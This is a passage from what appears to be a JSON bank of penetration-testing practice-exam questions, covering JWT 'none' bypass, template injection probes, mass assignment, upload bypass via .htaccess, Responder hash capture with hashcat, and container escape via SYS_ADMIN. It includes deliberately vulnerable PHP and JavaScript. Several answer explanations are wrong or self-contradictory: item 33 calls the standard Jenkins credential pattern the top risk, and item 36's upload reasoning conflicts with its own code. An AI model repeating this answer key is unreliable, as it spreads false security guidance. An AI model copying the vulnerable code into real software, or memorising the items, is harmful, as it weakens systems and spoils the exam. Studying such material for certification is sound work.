      "question": "A penetration tester is examining an application's source code and discovers the following JWT verification function:\n\n```javascript\nfunction verifyToken(token) {\n  const [headerB64, payloadB64, signature] = token.split('.');\n  \n  // Decode header and payload\n  const header = JSON.parse(Buffer.from(headerB64, 'base64').toString());\n  const payload = JSON.parse(Buffer.from(payloadB64, 'base64').toString());\n  \n  // Verify token has not expired\n  const currentTime = Math.floor(Date.now() / 1000);\n  if (payload.exp && payload.exp < currentTime) {\n    return { valid: false, reason: 'Token expired' };\n  }\n  \n  // Verify signature based on algorithm\n  if (header.alg === 'none') {\n    return { valid: true, payload };\n  } else if (header.alg === 'HS256') {\n    const expectedSignature = calculateHmacSignature(headerB64 + '.' + payloadB64, SECRET_KEY);\n    return { \n      valid: signature === expectedSignature,\n      payload: signature === expectedSignature ? payload : null\n    };\n  }\n  \n  return { valid: false, reason: 'Unsupported algorithm' };\n}\n```\n\nWhich vulnerability is present in this JWT implementation?",
      "options": [
        "The implementation accepts 'none' as a valid algorithm, allowing signature bypass",
        "The JWT signature verification is vulnerable to timing attacks",
        "Lack of validation for required claims in the JWT payload",
        "Improper base64 decoding of the JWT components"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The function explicitly accepts 'none' as a valid algorithm for JWT verification, returning 'valid: true' without checking the signature if the alg header is set to 'none'. This is a critical vulnerability that allows attackers to forge tokens by simply changing the algorithm to 'none' and removing the signature portion, effectively bypassing the signature verification entirely. The signature comparison uses the === operator, which is not vulnerable to timing attacks in most JavaScript implementations. While the function only checks for the 'exp' claim, there's no universal requirement to validate specific claims beyond expiration, so this isn't necessarily a vulnerability. The base64 decoding appears to be implemented correctly using Buffer.from().toString() with the appropriate encoding.",
      "examTip": "When reviewing JWT verification code, always check how the 'alg: none' case is handled. Secure implementations should reject tokens with 'none' as the algorithm, as this is a well-known attack vector that allows signature bypass."
    },
    {
      "id": 32,
      "question": "A penetration tester is analyzing a web application and intercepts the following HTTP request:\n\n```\nPOST /user/messages HTTP/1.1\nHost: app.example.com\nCookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQyLCJyb2xlIjoidXNlciIsImlhdCI6MTYzNDU2Nzg5MH0.dW5kZWZpbmVk\nContent-Type: application/x-www-form-urlencoded\n\nrecipient_id=1337&message=Hello%2C%20this%20is%20a%20test%20message.&template_id=system_notification&cc_admin=false\n```\n\nWhich parameter in this request is most likely to be vulnerable to server-side template injection?",
      "options": [
        "template_id",
        "message",
        "recipient_id",
        "cc_admin"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The parameter 'template_id' is most likely to be vulnerable to server-side template injection (SSTI). The name 'template_id' suggests that the application uses some form of templating system to render content, and the value 'system_notification' indicates it might be selecting a predefined template. If the application doesn't properly validate the template identifier or if an attacker can specify a custom template or template syntax, it could lead to template injection vulnerabilities. The 'message' parameter likely contains user content that would be inserted into a template rather than being interpreted as template code itself. 'recipient_id' appears to be a numeric identifier for the message recipient, which wouldn't typically be processed by a template engine. 'cc_admin' is a boolean flag that also wouldn't be processed as template code.",
      "examTip": "When testing for server-side template injection vulnerabilities, focus on parameters that might influence template selection or processing like 'template', 'template_id', 'view', 'page', or 'theme'. Try injecting template syntax like {{7*7}} or ${7*7} and observe if the expressions are evaluated in the response."
    },
    {
      "id": 33,
      "question": "A penetration tester has accessed a Jenkins server and finds the following configuration in a pipeline script:\n\n```groovy\npipeline {\n    agent any\n    environment {\n        AWS_ACCESS_KEY_ID = credentials('jenkins-aws-key')\n        AWS_SECRET_ACCESS_KEY = credentials('jenkins-aws-secret')\n    }\n    stages {\n        stage('Deploy') {\n            steps {\n                withCredentials([usernamePassword(credentialsId: 'prod-db-creds', usernameVariable: 'DB_USER', passwordVariable: 'DB_PASS')]) {\n                    sh '''\n                        cd /var/lib/jenkins/workspace/deployment\n                        echo \"Deploying application...\"\n                        ./deploy.sh --environment production \\\n                            --db-host db.example.com \\\n                            --db-user \"${DB_USER}\" \\\n                            --db-pass \"${DB_PASS}\" \\\n                            --aws-key \"${AWS_ACCESS_KEY_ID}\" \\\n                            --aws-secret \"${AWS_SECRET_ACCESS_KEY}\"\n                    '''\n                }\n            }\n        }\n    }\n}\n```\n\nWhich part of this pipeline configuration creates the highest security risk?",
      "options": [
        "The use of single quotes (''') in the shell script block prevents variable interpolation",
        "Hardcoded database hostname in the deployment script",
        "AWS credentials exposed in environment variables accessible to all pipeline stages",
        "Workspace path disclosure revealing the Jenkins installation directory"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The highest security risk in this pipeline configuration is the use of triple single quotes (''') for the shell script block. In Groovy, triple single quotes create a string literal where variable interpolation does not occur. This means that instead of inserting the actual values of ${DB_USER}, ${DB_PASS}, ${AWS_ACCESS_KEY_ID}, and ${AWS_SECRET_ACCESS_KEY}, the script will pass these literal strings including the dollar sign and curly braces to the shell. When the shell executes, it will attempt to interpolate these variables, but since they aren't defined in the shell environment, they will be empty or contain unexpected values. This effectively negates the security benefit of using the withCredentials block and credentials() method, which are designed to securely inject sensitive values. The hardcoded database hostname is not necessarily a security risk. AWS credentials in environment variables are handled securely by Jenkins through the credentials() method. The workspace path is a standard Jenkins convention and not a significant security concern.",
      "examTip": "When reviewing code for credential handling, pay close attention to string interpolation mechanisms in different programming languages. In Jenkins pipelines specifically, use double quotes for shell blocks that need to interpolate Groovy variables, and ensure that sensitive credentials are properly injected into the execution environment."
    },
    {
      "id": 34,
      "question": "A penetration tester discovers that a company has their main DNS server exposed to the internet. Using the following Nmap command, they identify that the server accepts zone transfers:\n\n```\n$ nmap -sT -p 53 --script=dns-zone-transfer --script-args dns-zone-transfer.domain=example.com ns1.example.com\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2023-10-22 15:43 EDT\nNmap scan report for ns1.example.com (203.0.113.10)\nHost is up (0.087s latency).\n\nPORT   STATE SERVICE\n53/tcp open  domain\n| dns-zone-transfer: \n| example.com. SOA ns1.example.com. admin.example.com. 2023051401 10800 3600 604800 38400\n| example.com. NS ns1.example.com.\n| example.com. NS ns2.example.com.\n| example.com. MX 10 mail.example.com.\n| example.com. A 203.0.113.20\n| www.example.com. A 203.0.113.20\n| mail.example.com. A 203.0.113.30\n| vpn.example.com. A 203.0.113.40\n| intranet.example.com. A 10.10.10.5\n| admin-portal.example.com. A 10.10.10.10\n| dev-server.example.com. A 10.10.20.30\n| jenkins.example.com. CNAME ci.internal.example.com.\n| db-primary.example.com. A 10.10.30.10\n|_db-backup.example.com. A 10.10.30.11\n\nNmap done: 1 IP address (1 host) up, scanned in 2.15 seconds\n```\n\nWhich discovered information provides the most valuable attack vector?",
      "options": [
        "Internal IP addresses of critical systems exposed through DNS records",
        "Secondary DNS server information revealed in NS records",
        "Email administrator contact exposed in the SOA record",
        "DNS server version information exposed through the banner"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The DNS zone transfer reveals internal IP addresses (10.10.x.x) for several critical systems, including 'admin-portal.example.com', 'dev-server.example.com', and database servers. This information provides significant value to an attacker by exposing the internal network structure and identifying high-value targets that should not be visible externally. Additionally, the CNAME record for 'jenkins.example.com' points to an internal domain 'ci.internal.example.com', further revealing internal naming conventions. The secondary DNS server information in NS records is already public by design and provides limited value for attacks. The SOA record contains an email address (admin.example.com) but doesn't directly expose credentials or sensitive systems. There is no DNS server version information exposed in the output provided.",
      "examTip": "During DNS reconnaissance, successful zone transfers can reveal internal IP addressing schemes, naming conventions, and critical infrastructure that should never be exposed. Focus on identifying records with internal (RFC1918) IP addresses and CNAME records pointing to internal domains, as these provide insight into the organization's network architecture."
    },
    {
      "id": 35,
      "question": "A penetration tester discovers an API endpoint for updating user information. They intercept the following request and response:\n\nRequest:\n```\nPUT /api/v1/users/profile HTTP/1.1\nHost: api.example.com\nContent-Type: application/json\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlcklkIjoiMTAwMSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNTE2MjM5MDIyfQ.L7CzzRZGKi7dBXD9qgQAi9F2gQsPlf77cmYBt6jA56s\n\n{\n  \"displayName\": \"John Smith\",\n  \"email\": \"john.smith@example.com\",\n  \"avatarUrl\": \"https://example.com/avatars/johnsmith.jpg\"\n}\n```\n\nResponse:\n```\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"success\": true,\n  \"user\": {\n    \"id\": \"1001\",\n    \"displayName\": \"John Smith\",\n    \"email\": \"john.smith@example.com\",\n    \"avatarUrl\": \"https://example.com/avatars/johnsmith.jpg\",\n    \"role\": \"user\",\n    \"lastUpdated\": \"2023-10-22T14:35:26Z\"\n  }\n}\n```\n\nThe tester modifies the request to include additional fields:\n\n```\n{\n  \"displayName\": \"John Smith\",\n  \"email\": \"john.smith@example.com\",\n  \"avatarUrl\": \"https://example.com/avatars/johnsmith.jpg\",\n  \"role\": \"admin\"\n}\n```\n\nWhat vulnerability is the tester attempting to exploit?",
      "options": [
        "Mass assignment vulnerability",
        "JWT token manipulation",
        "IDOR vulnerability through user ID manipulation",
        "API versioning bypass"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The tester is attempting to exploit a mass assignment vulnerability (also known as auto-binding or object injection). By adding the 'role' field to the JSON request body, they are testing whether the API blindly binds all provided fields to the user object, potentially allowing privilege escalation by changing their role from 'user' to 'admin'. The API endpoint shown allows updating user profile information, but a securely implemented API would only update the explicitly allowed fields (displayName, email, avatarUrl) and ignore or reject attempts to modify sensitive fields like 'role'. JWT token manipulation would involve modifying the token itself to change the 'role' claim, not adding fields to the request body. There's no indication of IDOR vulnerability as the tester isn't attempting to access another user's profile. API versioning bypass would involve attempting to access a different API version with potentially fewer security controls.",
      "examTip": "When testing APIs that update user profiles or other objects, always attempt to include privileged fields that weren't part of the original request. If the API fails to properly filter input fields, it may allow updating restricted attributes like roles, permissions, or account status through mass assignment vulnerabilities."
    },
    {
      "id": 36,
      "question": "A penetration tester is evaluating a web application's security and discovers a custom file upload feature. The application's source code reveals the following server-side validation:\n\n```php\n<?php\n// File upload handling script\n\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    // Check if file was uploaded without errors\n    if (isset($_FILES['document']) && $_FILES['document']['error'] === 0) {\n        $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'doc', 'docx'];\n        $max_file_size = 5 * 1024 * 1024; // 5MB in bytes\n        \n        $file_name = $_FILES['document']['name'];\n        $file_size = $_FILES['document']['size'];\n        $file_tmp = $_FILES['document']['tmp_name'];\n        $file_ext = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));\n        \n        // Check file size\n        if ($file_size > $max_file_size) {\n            echo \"Error: File size exceeds the limit of 5MB\";\n            exit();\n        }\n        \n        // Check file extension\n        if (!in_array($file_ext, $allowed_extensions)) {\n            echo \"Error: Invalid file extension. Allowed types: \" . implode(', ', $allowed_extensions);\n            exit();\n        }\n        \n        // Generate a unique filename\n        $new_file_name = uniqid('doc_') . '.' . $file_ext;\n        $upload_path = 'uploads/' . $new_file_name;\n        \n        // Move the file to the uploads directory\n        if (move_uploaded_file($file_tmp, $upload_path)) {\n            $file_url = 'https://example.com/' . $upload_path;\n            echo json_encode(['success' => true, 'file_url' => $file_url]);\n        } else {\n            echo \"Error: Failed to upload file\";\n        }\n    } else {\n        echo \"Error: \" . $_FILES['document']['error'];\n    }\n}\n```\n\nWhich attack technique would bypass these security controls?",
      "options": [
        "Uploading a file with multiple extensions like 'exploit.php.jpg'",
        "Using a .htaccess file to configure PHP execution for image files",
        "Exploiting the uniqid() function's predictability",
        "Exceeding the file size limit to trigger error handling code paths"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The most effective attack technique would be uploading a .htaccess file to configure PHP execution for image files. The code verifies file extensions against a whitelist but doesn't validate the actual file content or MIME type. The validation only checks the file extension using pathinfo(), which returns the last extension in a filename. A .htaccess file could be uploaded with the extension renamed to an allowed one (e.g., .htaccess.jpg), and once renamed to its original form in the uploads directory, it could be used to change server configurations to execute PHP code within files with image extensions. Multiple extensions like 'exploit.php.jpg' wouldn't work because pathinfo() would return 'jpg' as the extension, which is on the allowed list, but the file would still be stored with the .jpg extension and not executed as PHP. The uniqid() function's predictability isn't relevant here as it's only used for filename generation, not security control. Exceeding the file size limit would trigger an error and exit the script, not bypass security controls.",
      "examTip": "When testing file upload functionality, check if you can upload configuration files like .htaccess (disguised with allowed extensions) to modify server behavior. Even with extension whitelist validation, attackers can sometimes upload special files that change how the server processes other uploaded files, effectively bypassing the original security controls."
    },
    {
      "id": 37,
      "question": "A penetration tester is examining a web application's behavior related to authentication tokens. The tester captures the following request and response:\n\nRequest:\n```\nPOST /api/auth/login HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\n  \"username\": \"testuser\",\n  \"password\": \"P@ssw0rd123\"\n}\n```\n\nResponse:\n```\nHTTP/1.1 200 OK\nContent-Type: application/json\nSet-Cookie: auth_token=7y8j1x2z3a4b5c6d; Path=/; HttpOnly\n\n{\n  \"success\": true,\n  \"message\": \"Login successful\",\n  \"user_id\": 12345,\n  \"session_token\": \"7y8j1x2z3a4b5c6d\"\n}\n```\n\nAfter further testing, the tester creates the following table of observations:\n\n| Token             | Result       | Response Time (ms) |\n|-------------------|--------------|-------------------|\n| 7y8j1x2z3a4b5c6d  | Valid        | 157                |\n| 7y8j1x2z3a4b5c6e  | Invalid      | 1542               |\n| 7y8j1x2z3a4b5c6f  | Invalid      | 1538               |\n| 8y8j1x2z3a4b5c6d  | Invalid      | 142                |\n| 9y8j1x2z3a4b5c6d  | Invalid      | 139                |\n\nWhich vulnerability is present in the token validation mechanism?",
      "options": [
        "Time-based side-channel vulnerability during token validation",
        "Session token predictability due to sequential generation",
        "Token value exposure in both cookie and JSON response",
        "Missing secure flag on the authentication cookie"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The response time data indicates a time-based side-channel vulnerability in the token validation mechanism. When tokens with minor changes at the end (7y8j1x2z3a4b5c6e, 7y8j1x2z3a4b5c6f) are tested, the response time is significantly longer (1542ms, 1538ms) compared to the valid token (157ms) or tokens with changes at the beginning (8y8j1x2z3a4b5c6d, 9y8j1x2z3a4b5c6d) which have quick response times (142ms, 139ms). This pattern suggests that the application is likely using a string comparison function that stops at the first mismatch when validating tokens. When the first characters match but later ones don't, the comparison takes longer because it processes more characters before finding a mismatch. This vulnerability could allow attackers to guess valid tokens character by character by observing response times. There's no evidence of sequential token generation from the limited tokens shown. The token value being in both the cookie and JSON response is a design choice but not inherently a vulnerability. While the missing secure flag is a security issue, it's not directly related to the token validation mechanism behavior observed in the response time patterns.",
      "examTip": "When testing authentication systems, measure and compare response times for various token modifications. A consistent pattern where invalid tokens with matches in the first N characters take longer to process than invalid tokens with mismatches at the beginning can indicate a timing side-channel vulnerability that leaks information about valid tokens."
    },
    {
      "id": 38,
      "question": "A penetration tester is analyzing traffic from an IoT device and captures the following MQTT packets:\n\n```\n# Connect packet\nPacket 1: MQTT CONNECT\n  Protocol: MQTT 3.1.1\n  Client ID: thermostat_living_room\n  Username: device_44a87cb1\n  Password: 7c68b2f4d8e1a359c6f21a0b\n\n# Subscribe packet\nPacket 2: MQTT SUBSCRIBE\n  Packet ID: 1\n  Topic Filter: home/temperature/+\n  Requested QoS: 0\n\n# Publish packet\nPacket 3: MQTT PUBLISH\n  Topic: home/temperature/living_room\n  QoS: 0\n  Retain: false\n  Payload: {\"temp\":22.5,\"humidity\":45,\"timestamp\":1634567890,\"device_id\":\"thermostat_living_room\",\"api_key\":\"c68a9d7f4e3b1a2f5c8e9d6b\"}\n\n# Publish packet\nPacket 4: MQTT PUBLISH\n  Topic: home/commands/thermostat_living_room\n  QoS: 1\n  Retain: false\n  Payload: {\"command\":\"set_temperature\",\"value\":23,\"auth_token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJ0aGVybW9zdGF0X2xpdmluZ19yb29tIn0.a1b2c3d4e5f6g7h8i9j0\"}\n```\n\nWhich security vulnerability presents the highest risk in this implementation?",
      "options": [
        "Authentication credentials transmitted in cleartext MQTT packets",
        "Unencrypted API keys included in sensor data payloads",
        "Insufficient access controls allowing subscription to wildcard topics",
        "Command injection vulnerability in the temperature setting command"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The highest risk vulnerability is the transmission of authentication credentials in cleartext MQTT packets. In Packet 1, the device connects to the MQTT broker using plaintext username ('device_44a87cb1') and password ('7c68b2f4d8e1a359c6f21a0b'). Since MQTT itself doesn't provide encryption, these credentials are exposed to anyone who can capture the network traffic. This could allow an attacker to authenticate as the device and send malicious commands or intercept sensitive data. While the API key in the temperature data payload (Packet 3) is also sensitive, it typically provides more limited access than the primary authentication credentials. The wildcard topic subscription (home/temperature/+) is common practice for IoT devices and not inherently a vulnerability without evidence of insufficient access controls. There's no indication of a command injection vulnerability in the temperature setting command from the provided packets; the JSON structure appears properly formatted with no obvious injection points.",
      "examTip": "When analyzing IoT protocols like MQTT, prioritize findings related to authentication mechanisms. Plain text credentials in MQTT CONNECT packets are particularly severe as they provide direct access to the broker and potentially all device communications. Always recommend using TLS/SSL for the MQTT connection to encrypt all traffic including credentials."
    },
    {
      "id": 39,
      "question": "A penetration tester is evaluating a mobile banking application and discovers the following network request during a funds transfer operation:\n\n```\nPOST /api/transfers HTTP/1.1\nHost: api.bankexample.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMzQ1Njc4LCJleHAiOjE2MzQ1ODc4OTB9.a1b2c3d4e5f6g7h8i9j0\nContent-Type: application/json\nX-Device-ID: a1b2c3d4-e5f6-g7h8-i9j0-k1l2m3n4o5p6\nX-API-Version: 2.1\n\n{\n  \"sourceAccount\": \"1234567890\",\n  \"destinationAccount\": \"0987654321\",\n  \"amount\": 500.00,\n  \"currency\": \"USD\",\n  \"description\": \"Rent payment October\",\n  \"transactionId\": \"TX-1634567890-123456\"\n}\n```\n\nAfter modifying the request to change only the amount value to 5000.00, the tester receives:\n\n```\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"status\": \"success\",\n  \"message\": \"Transfer initiated successfully\",\n  \"referenceId\": \"REF-1634567890-123456\"\n}\n```\n\nWhat critical security control is missing in this implementation?",
      "options": [
        "Transaction signing for financial operations",
        "Rate limiting to prevent multiple rapid transfers",
        "Multi-factor authentication for high-value transactions",
        "Input validation for reasonable transfer amounts"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The critical security control missing in this implementation is transaction signing for financial operations. The application accepted a modified transfer amount (from $500 to $5000) without requiring any additional verification or authentication of the transaction details. In a secure banking application, sensitive financial operations like fund transfers should require transaction signing, where the exact details of the transaction (including the amount, destination account, etc.) are cryptographically signed by a separate factor (such as a hardware token, mobile authenticator, or SMS code). This prevents attackers from modifying transaction details even if they can intercept and alter the initial request. While rate limiting, multi-factor authentication, and input validation are important security controls, they wouldn't address the core vulnerability demonstrated here: the ability to modify transaction details without detection. Input validation might reject unreasonable amounts, but $5000 is a plausible transfer amount that would likely pass validation rules.",
      "examTip": "When testing financial applications, always verify that transaction details are cryptographically bound to the authorization mechanism. A secure implementation should either require re-authentication for modified transactions or include a transaction signature derived from the specific transaction details, preventing silent modifications to critical parameters like transfer amounts or destination accounts."
    },
    {
      "id": 40,
      "question": "A penetration tester is analyzing a web application's authentication mechanism and inspects the following code snippet responsible for password verification:\n\n```php\nfunction verifyPassword($username, $password) {\n    global $db;\n    \n    // Get stored password hash for the user\n    $query = \"SELECT password_hash FROM users WHERE username = '$username'\";\n    $result = $db->query($query);\n    \n    if ($result && $result->num_rows > 0) {\n        $row = $result->fetch_assoc();\n        $stored_hash = $row['password_hash'];\n        \n        // Compare password with stored hash\n        if (hash_equals($stored_hash, md5($password))) {\n            return true;\n        }\n    }\n    \n    return false;\n}\n```\n\nWhich two security vulnerabilities are present in this code?",
      "options": [
        "SQL injection vulnerability and weak password hashing algorithm",
        "Timing attack vulnerability and lack of password salting",
        "Hardcoded credentials and insecure error handling",
        "Cross-site scripting vulnerability and improper session management"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This code contains two significant security vulnerabilities: SQL injection and a weak password hashing algorithm. The SQL injection vulnerability exists because the username parameter is directly concatenated into the SQL query without any sanitization or prepared statements, allowing an attacker to manipulate the query structure with a maliciously crafted username. The weak password hashing vulnerability exists because the code uses MD5 for password hashing, which is cryptographically broken and unsuitable for password storage. MD5 is vulnerable to collision attacks, can be computed very quickly (facilitating brute force attacks), and lacks salt integration to prevent rainbow table attacks. While the code does use hash_equals() to prevent timing attacks during hash comparison, this protection is undermined by the fundamental weaknesses in MD5. There are no hardcoded credentials visible in the provided code. There's no evidence of XSS vulnerability or session management issues in this password verification function.",
      "examTip": "When reviewing authentication code, look for both how passwords are stored and how they're verified. Modern secure implementations should use adaptive hashing functions like bcrypt, Argon2, or PBKDF2 with appropriate work factors and salts, and should always use parameterized queries for database operations to prevent SQL injection."
    },
    {
      "id": 41,
      "question": "A penetration tester is assessing a Windows domain and discovers that LLMNR and NetBIOS Name Service are enabled throughout the network. The tester sets up Responder and captures the following hash:\n\n```\n[SMB] NTLMv2-SSP Client   : 192.168.1.55\n[SMB] NTLMv2-SSP Username : CORP\\jsmith\n[SMB] NTLMv2-SSP Hash     : jsmith::CORP:1122334455667788:A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6:0101000000000000006CD7EAECBAD801F7C39B4A1AFE31170000000002000800470048004F00530054000100080047004800\n4F00530054000400080047004800\n4F005300540003001400\n47004800\n4F00530054002E004C004F00430041004C000500\n140047004800\n4F00530054002E004C004F00430041004C000700\n08006759F6E8ECBAD8010600\n04000200000008003000\n30000000000000000000000000400000A0683A522C836625CD141645F062553FB3CD05701A160D9E16F47A7B0B2EAE85D0A001000000000000000000000000000000000000900\n220063006900660073002F00\n66006900\n6C006500\n73006500\n72007600\n65007200\n0200\n00000000000000000000000\n```\n\nWhat technique should the tester use to leverage this captured information?",
      "options": [
        "Crack the NTLMv2 hash offline using hashcat",
        "Perform a relay attack to authenticate to internal services",
        "Use the captured hash to generate a Kerberos silver ticket",
        "Extract the plaintext credentials from the encoded SMB data"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The tester should crack the NTLMv2 hash offline using hashcat or a similar password cracking tool. The output shows a captured NTLMv2 hash for the user 'CORP\\jsmith', which was obtained through Responder's poisoning of LLMNR or NetBIOS Name Service requests. NTLMv2 hashes cannot be directly used in pass-the-hash attacks but must be cracked to reveal the plaintext password. Once cracked, the password can be used for various authentication attempts throughout the domain. While relay attacks are possible with NTLMv2 authentication, the provided output shows that Responder has already captured the hash rather than being configured in relay mode, making offline cracking the appropriate next step. NTLMv2 hashes cannot be used to generate Kerberos silver tickets, which require different credentials or key material. The encoded SMB data at the end of the hash contains authentication metadata, not extractable plaintext credentials.",
      "examTip": "When capturing NTLMv2 hashes through LLMNR/NBT-NS poisoning, always attempt offline cracking with tools like hashcat. Unlike NTLMv1 or Net-NTLMv1, these hashes cannot be directly reused but often reveal weak passwords. Use hashcat mode 5600 for NTLMv2 and focus on employees with potential access to sensitive systems."
    },
    {
      "id": 42,
      "question": "A penetration tester is auditing the security of a web application's forgot password functionality and observes the following behavior:\n\n1. When requesting a password reset for an existing email address (test@example.com), the application responds with:\n   ```\n   A password reset link has been sent to your email address.\n   ```\n\n2. When requesting a password reset for a non-existent email address (nonexistent@example.com), the application responds with:\n   ```\n   We couldn't find an account with that email address.\n   ```\n\n3. The reset link in the email follows this format:\n   ```\n   https://application.com/reset-password?token=a1b2c3d4e5f6g7h8i9j0\n   ```\n\n4. Analyzing multiple reset tokens reveals they are 20 characters long and consist only of lowercase letters and numbers.\n\nWhich attack technique would be most effective against this implementation?",
      "options": [
        "Username enumeration through differential responses",
        "Brute forcing the password reset tokens",
        "CSRF attack against the password reset form",
        "Session fixation through manipulated reset links"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The most effective attack technique would be username enumeration through differential responses. The application provides distinctly different messages depending on whether an email address exists in the system or not. When a valid email is provided, it responds with 'A password reset link has been sent to your email address,' but for invalid emails, it states 'We couldn't find an account with that email address.' This information disclosure allows an attacker to systematically determine which email addresses have accounts in the system, facilitating more targeted attacks like credential stuffing or phishing. While brute forcing the reset tokens might be possible, 20 characters of lowercase letters and numbers (36^20 possibilities) provides sufficient entropy to make brute force attacks impractical. There's no evidence that the password reset form is vulnerable to CSRF, which would require analysis of the form itself. Session fixation would require the ability to set a user's session identifier, which isn't indicated in the provided information.",
      "examTip": "When testing forgot password functionality, check for information disclosure through differential responses that could enable account enumeration. Applications should provide identical responses regardless of whether the email exists or not, such as 'If an account exists with this email, a password reset link will be sent' to prevent enumeration attacks."
    },
    {
      "id": 43,
      "question": "A penetration tester is examining a Docker host and discovers a container running with the following configuration:\n\n```bash\n$ docker inspect webapp-container\n[\n    {\n        \"Id\": \"abc123def456...\",\n        \"Name\": \"/webapp-container\",\n        \"State\": {\n            \"Status\": \"running\",\n            \"Running\": true,\n            \"Pid\": 1234\n        },\n        \"HostConfig\": {\n            \"Privileged\": false,\n            \"CapAdd\": [\n                \"SYS_ADMIN\"\n            ],\n            \"Binds\": [\n                \"/var/log/webapp:/app/logs\",\n                \"/etc/webapp/config.json:/app/config/config.json:ro\"\n            ],\n            \"NetworkMode\": \"bridge\"\n        },\n        \"Mounts\": [\n            {\n                \"Type\": \"bind\",\n                \"Source\": \"/var/log/webapp\",\n                \"Destination\": \"/app/logs\"\n            },\n            {\n                \"Type\": \"bind\",\n                \"Source\": \"/etc/webapp/config.json\",\n                \"Destination\": \"/app/config/config.json\",\n                \"RO\": true\n            }\n        ],\n        \"Config\": {\n            \"Image\": \"webapp:latest\",\n            \"Entrypoint\": [\"/app/entrypoint.sh\"],\n            \"Env\": [\n                \"DB_PASSWORD=securepassword123\",\n                \"API_KEY=a1b2c3d4e5f6g7h8i9j0\"\n            ]\n        }\n    }\n]\n```\n\nWhich container security issue presents the highest risk?",
      "options": [
        "Container running with SYS_ADMIN capability",
        "Sensitive credentials exposed in environment variables",
        "Host filesystem directories mounted into the container",
        "Container running in privileged mode"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The highest risk issue is the container running with the SYS_ADMIN capability. The SYS_ADMIN capability is particularly dangerous as it grants a wide range of powerful permissions, including the ability to mount and unmount filesystems, which can potentially be exploited to escape the container and access the host system. This capability can often be abused to gain root access on the host machine through techniques like mounting procfs with modified release_agent files. While environment variables containing sensitive credentials (DB_PASSWORD and API_KEY) pose a security risk, they're generally limited to compromising only the resources those credentials access. The host filesystem mounts (/var/log/webapp and /etc/webapp/config.json) create potential data exposure but are relatively limited in scope, with one being read-only. The configuration explicitly shows 'Privileged: false', indicating the container is not running in privileged mode, which would have been an even higher risk if enabled.",
      "examTip": "When assessing container security, the SYS_ADMIN capability should always raise significant concerns. This capability is nearly equivalent to running in fully privileged mode and provides multiple container escape paths, particularly through filesystem mounting operations that can be leveraged to execute code on the host."
    },
    {
      "id": 44,
      "question": "A penetration tester discovers an internally developed API used by a company's mobile application. By intercepting the mobile app's traffic, the tester finds that API requests use a custom authorization scheme:\n\n```\nGET /api/v1/users/profile HTTP/1.1\nHost: api.company.internal\nX-API-Version: 1.0\nX-Device-ID: A1B2C3D4E5F6\nX-Auth-Timestamp: 1634567890\nX-Auth-Signature: 83d7fbb6b5712b6a3a7f587d18cb4e09f16b91f5c63b9ca0b14ee51f6ddef245\n```\n\nThrough further analysis of the mobile application's code, the tester discovers that the X-Auth-Signature is generated using the following algorithm:\n\n```javascript\nfunction generateSignature(apiKey, timestamp, deviceId) {\n  const message = `${apiKey}|${timestamp}|${deviceId}`;\n  return sha256(message);\n}\n```\n\nThe tester also finds that the API key is hardcoded in the mobile app as `c8fb213857d3491a9b7e9be5487b5ff2`.\n\nWhich attack technique would be most effective against this authentication mechanism?",
      "options": [
        "Signature replay by reusing a captured valid signature with its corresponding timestamp",
        "API key extraction from the mobile application and signature forgery",
        "Manipulating the X-Device-ID parameter to impersonate another user's device",
        "Brute forcing the SHA-256 hash to reverse-engineer the API key"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The most effective attack technique would be API key extraction from the mobile application and signature forgery. Since the tester has discovered that the API key is hardcoded in the mobile app ('c8fb213857d3491a9b7e9be5487b5ff2') and has identified the exact algorithm used to generate the signature, they can generate valid signatures for any request. By knowing the API key, timestamp, and device ID, the tester can calculate valid X-Auth-Signature values for new requests, effectively bypassing the authentication mechanism entirely. Signature replay would be ineffective if the API server validates that timestamps are recent or checks for duplicate timestamps. Manipulating the X-Device-ID alone wouldn't work because the signature incorporates this value, so changing it without updating the signature would result in verification failure. Brute forcing a SHA-256 hash is computationally infeasible, and unnecessary since the API key has already been discovered.",
      "examTip": "When testing mobile applications, always check for hardcoded credentials and secret keys in the application code or resources. Mobile apps often implement custom authentication schemes that rely on client-side secrets, which can be extracted and used to forge valid authentication materials once the generation algorithm is understood."
    },
    {
      "id": 45,
